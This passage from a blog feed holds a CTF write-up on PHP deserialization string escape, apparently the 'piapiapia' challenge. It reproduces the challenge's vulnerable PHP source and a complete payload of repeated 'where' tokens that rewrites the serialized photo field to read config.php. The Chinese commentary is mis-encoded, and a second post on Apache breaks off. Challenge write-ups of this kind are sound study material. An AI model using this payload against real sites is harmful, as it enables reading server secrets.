class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key_list</span> = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"><span class="variable">$value_list</span> = <span class="keyword">Array</span>(<span class="variable">$username</span>, md5(<span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="built_in">parent</span>::filter(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === md5(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">);</span><br><span class="line">mysql_select_db(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line"><span class="keyword">return</span> mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$key</span> = implode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line"><span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> user();</span><br><span class="line"><span class="variable">$user</span>-&gt;connect(<span class="variable">$config</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">config.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">update.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class="line">&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Email:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line">&lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Photo:&lt;/label&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é˜…è¯»æºç åå‘ç°å…¶èµ„æ–™æ›´æ–°æµç¨‹æ˜¯è¿™æ ·çš„ï¼š<br>åœ¨update.phpç‚¹å‡»æ›´æ–°èµ„æ–™åï¼Œåœ¨æœ¬é¡µé¢å¤„ç†ï¼Œç»è¿‡æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤åé€šè¿‡çš„è¯ï¼Œåœ¨userç±»ä¸­çš„update_profileæ–¹æ³•ä¸­æ‰§è¡Œåºåˆ—åŒ–åçš„profile<br>$user-&gt;update_profile($username, serialize($profile));<br>è·Ÿè¿›user-&gt;update_profileæ–¹æ³•ï¼š<br>ç”¨æˆ·åå’Œèµ„æ–™ç»è¿‡è¿‡æ»¤å™¨fileterè¿‡æ»¤åç›´æ¥ä¸¢ç»™mysqlæ›´æ–°,ç»§ç»­è·Ÿè¿›filter<br>ä¸»è¦æ˜¯æ­£åˆ™æ›¿æ¢ã€‚æŠŠå±é™©å­—æ®µæ›¿æ¢ä¸ºâ€œhackerâ€ã€‚è¿™é‡Œæœ‰é—®é¢˜ã€‚æš‚æ—¶ä¸ç®¡ï¼Œç»§ç»­è·Ÿè¿›ã€‚<br>é¡ºåˆ©é€šè¿‡filterååˆ™å¯é¡ºåˆ©æ›´æ–°ç”¨æˆ·èµ„æ–™ã€‚<br>å†çœ‹profile.phpé‡Œé¢è¿™å¥è¯:<br>$photo = base64_encode(file_get_contents($profile[â€˜photoâ€™]));<br>file_get_contents æ˜¯ä¸æ˜¯æƒ³åˆ°äº†ä»€ä¹ˆï¼Ÿä¼ªåè®®ï¼Ÿ<br>æˆ‘ä»¬æƒ³è¯»å–åˆ°çš„æ–‡ä»¶æ˜¯config.php å› ä¸ºé‡Œé¢å·²ç»æç¤ºäº†æœ‰flagå­—æ®µã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„æ˜¯è®©file_get_contents()åŒ…å«config.phpè¿™ä¸ªæ–‡ä»¶<br>å…ˆè‡ªå·±å°è¯•ä¸‹æ›¿æ¢æ–‡ä»¶åï¼Œå¤±è´¥äº†ã€‚<br>æ¥ä¸‹æ¥è€ƒè™‘ä¼ªåè®®ï¼Œä¹Ÿå¤±è´¥äº†ã€‚ã€‚<br>ç„¶åè€ƒè™‘ååºåˆ—åŒ–çš„é—®é¢˜<br>é¦–å…ˆæ˜ç™½ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–<br>ä¸ªäººç†è§£ååºåˆ—åŒ–å°±æ˜¯æŠŠå¯¹è±¡ï¼Œå˜é‡ï¼Œå„ç§å±æ€§ä¸ä¸€çš„æ–‡ä»¶é€šè¿‡ä¸€ç§å½¢å¼çš„è½¬æ¢è½¬æ¢æˆå­—ç¬¦ä¸²ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œå¹¶ä¸”è¿˜èƒ½é€šè¿‡è¯¥å­—ç¬¦ä¸²è¿˜åŸè¯¥å¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰<br>ä¸€ä¸ªä¾‹å­å°±æ˜¯sså¯¼å‡ºé…ç½®çš„æ—¶å€™ç»™ä»–base64è§£å¯†çœ‹çœ‹æ˜¯ä¸æ˜¯åºåˆ—åŒ–çš„æ€æƒ³å‘¢2333<br>ä¸¾ä¸ªæ —å­</p><img src="http://cdn.polowong.top/static/images/uns2.jpg"><p>ååºåˆ—åŒ–ä¸¥æ ¼æŒ‰ç…§é•¿åº¦è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦‚æœé•¿åº¦æ”¹å˜çš„è¯å¯èƒ½ååºåˆ—åŒ–å¤±è´¥ã€‚æ¯”å¦‚ï¼š</p><img src="http://cdn.polowong.top/static/images/uns3.jpg"><p>åœ¨ååºåˆ—åŒ–ä¹‹å‰ï¼Œæˆ‘æŠŠæœ€åä¸€ä¸ªå­—ç¬¦ä¸²åŠ äº†ä¸€ä¸ªd ä½†æ˜¯å‰é¢çš„é•¿åº¦è¿˜æ˜¯5æ²¡æœ‰å˜ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å¤±è´¥äº†ï¼ŒæŠ¥é”™ã€‚<br>è¿˜æœ‰ä¸€ç§æƒ…å†µï¼š<br>é€šè¿‡è‡ªå·±æ„é€ çš„ååºåˆ—åŒ–å¯¹è±¡ï¼Œå¯ä»¥ä¿®æ”¹å¯¹è±¡çš„æŸäº›å±æ€§ã€‚<br>æ¯”å¦‚ä¹‹å‰cçš„æœ€åä¸€ä¸ªå­—ç¬¦ä¸²ä¸º234ï¼Œæˆ‘ä»¬æ„é€ $c1=â€™a:3:{i:0;s:3:â€123â€;i:1;s:3:â€abcâ€;i:2;s:5:â€wdnmdâ€;}â€;i:2;s:3:â€234â€;}â€™;<br>å°±æŠŠæœ€åä¸€ä¸ªå±æ€§çš„å€¼æ¢æˆäº†wdnmdï¼Œåé¢åŸæ¥çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚èµ·åˆ°äº†å¤¹å¸¦ç§è´§çš„ä½œç”¨ã€‚</p><img src="http://cdn.polowong.top/static/images/uns4.jpg"><p>è¿™é“é¢˜æˆ‘ä»¬æƒ³è®©photoçš„å€¼ä¸ºconfig.php,æ‰€ä»¥éœ€è¦åˆ©ç”¨ä¸Šé¢è¯´çš„å­—ç¬¦ä¸²é€ƒé€¸çš„é—®é¢˜ï¼Œå°†payloadæŒ¤åˆ°åé¢å»ã€‚<br>å…·ä½“ä»€ä¹ˆæ„æ€ï¼Ÿ<br>å¯¹nicknameçš„å†…å®¹è¿›è¡Œæ„é€ ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåºåˆ—åŒ–ä¹‹åé•¿åº¦å›ºå®šä¸å˜ã€‚å°±æ˜¯S:åé¢çš„æ•°å­—ã€‚ä½†æ˜¯é—®é¢˜å°±å‡ºç°åœ¨ä»–å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²æ›¿æ¢ï¼ŒæŠŠwhereæ›¿æ¢æˆhackerï¼Œä½¿å¾—å­—ç¬¦ä¸²é•¿åº¦+1ã€‚é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•åˆ©ç”¨ï¼Ÿ<br>é¦–å…ˆç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼å¯¹nickenameçš„åˆ¤æ–­ï¼Œç”¨æ•°ç»„å°±å¥½ã€‚nickname[]<br>æˆ‘ä»¬æƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²ä¸º  â€œ;}s:5:â€photoâ€;s:10:â€config.phpâ€;}   æ€»é•¿åº¦ä¸º34ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™34ä¸ªwhereåŠ ä¸Šæˆ‘ä»¬æƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²ä½œä¸ºpayloadï¼Œæ€»é•¿åº¦ä¸º204ï¼ˆåŒ…æ‹¬34ä¸ªwhereå’Œæƒ³ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼‰<br>åœ¨ç»è¿‡åºåˆ—åŒ–ï¼Œè¿‡æ»¤çš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰çš„whereè¢«æ›¿æ¢æˆå’Œhackerï¼Œè¿™æ ·åºåˆ—åŒ–åçš„s:204ä¸å˜ï¼Œnicknameçš„å€¼å˜æˆäº†34ä¸ªhackerï¼Œå¹¶ä¸”æˆåŠŸçš„ä¿®æ”¹äº†photoçš„å€¼ä¸ºconfig.php<br>payload:wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhereâ€;}s:5:â€photoâ€;s:10:â€config.phpâ€;}<br>æ³¨æ„ï¼š<br><strong>ä»»ä½•ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ˜¯ä¼šå¤±è´¥çš„ã€‚</strong><br>In the end:<br>php unserializeçš„é—®é¢˜æœ‰å¾ˆå¤šï¼Œæˆ‘åªæ˜¯å­¦ä¹ åˆ°äº†å…¶ä¸­çš„ä¸€ä¸ªï¼Œç­‰å­¦ä¹ åˆ°äº†å…¶ä»–çš„é—®é¢˜ç»§ç»­æ•´ç†ã€å·©å›ºä¸‹æ¥ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºapacheä¸phpçš„ç†è§£</title>
      <link href="2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>2020/04/13/%E5%85%B3%E4%BA%8Eapache%E4%B8%8Ephp%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="apacheä¸php"><a href="#apacheä¸php" class="headerlink" title="apacheä¸php"></a>apacheä¸php</h2><p>å½“å®¢æˆ·ç«¯è¯·æ±‚<a href="http://www.test.com/1.php%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8Capache%E7%9B%91%E5%90%AC80%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%94%B6%E5%88%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E8%AF%B7%E6%B1%82%E5%90%8E%E5%8F%91%E7%8E%B0%E6%98%AFPHP%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E8%AF%A5%E6%96%87%E4%BB%B6%E5%85%88%E7%BB%99PHP%E8%A7%A3%E9%87%8A%EF%BC%8C%E8%A7%A3%E9%87%8A%E5%AE%8C%E4%B9%8B%E5%90%8E%E6%B8%B2%E6%9F%93%E6%88%90html%E7%BB%99apache%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8Capache%E5%86%8D%E8%BF%94%E5%9B%9E%E7%BB%99%E5%AE%A2%E6%88%B7%E7%AB%AF%E3%80%82">www.test.com/1.phpçš„æ—¶å€™ï¼Œapacheç›‘å¬80ç«¯å£ï¼Œæ”¶åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚åå‘ç°æ˜¯PHPæ–‡ä»¶ï¼Œå°†è¯¥æ–‡ä»¶å…ˆç»™PHPè§£é‡Šï¼Œè§£é‡Šå®Œä¹‹åæ¸²æŸ“æˆhtmlç»™apacheæœåŠ¡å™¨ï¼Œapacheå†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</a></p><h2 id="vhostä¸hostsæ–‡ä»¶"><a href="#vhostä¸hostsæ–‡ä»¶" class="headerlink" title="vhostä¸hostsæ–‡ä»¶"></a>vhostä¸hostsæ–‡ä»¶</h2><p>hostsæ–‡ä»¶åœ¨æœ¬æœºä»£è¡¨æœ¬æœºdns æ ¼å¼ IP 